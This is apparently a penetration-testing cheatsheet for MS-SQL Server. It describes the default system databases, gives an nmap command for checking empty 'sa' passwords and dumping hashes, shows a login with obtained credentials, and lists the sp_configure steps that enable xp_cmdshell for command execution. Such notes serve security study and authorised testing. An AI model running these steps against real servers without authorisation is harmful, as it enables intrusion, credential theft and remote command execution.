## Basic information 
#### Default MS-SQL System Tables
- **master Database** : Records all the system-level information for an instance of SQL Server.
- **msdb Database** : Is used by SQL Server Agent for scheduling alerts and jobs.
- **model Database** : Is used as the template for all databases created on the instance of SQL Server. Modifications made to the model database, such as database size, collation, recovery model, and other database options, are applied to any databases created afterwards.
- **Resource Database** : Is a read-only database that contains system objects that are included with SQL Server. System objects are physically persisted in the Resource database, but they logically appear in the sys schema of every database.
- **tempdb Database** : Is a work-space for holding temporary objects or intermediate result sets.

**Tool**:- https://github.com/quentinhardy/msdat
**Cheatsheet** - https://www.asafety.fr/mssql-injection-cheat-sheet/

**Nmap port enumeration**
```nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes    --script-args mssql.instance port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER $ip```


## Execute commands 
#### After getting the credentials 
```bash
sqsh -U sa -P password -S 10.0.0.1:1433 -D mydb
```

#### Enable the `xp_cmdshell` to execute the command
```bash 
# To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1;  
GO  

# To update the currently configured value for advanced options.  
RECONFIGURE;  
GO  
# To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1;  
GO  
# To update the currently configured value for this feature.  
RECONFIGURE;  
GO
```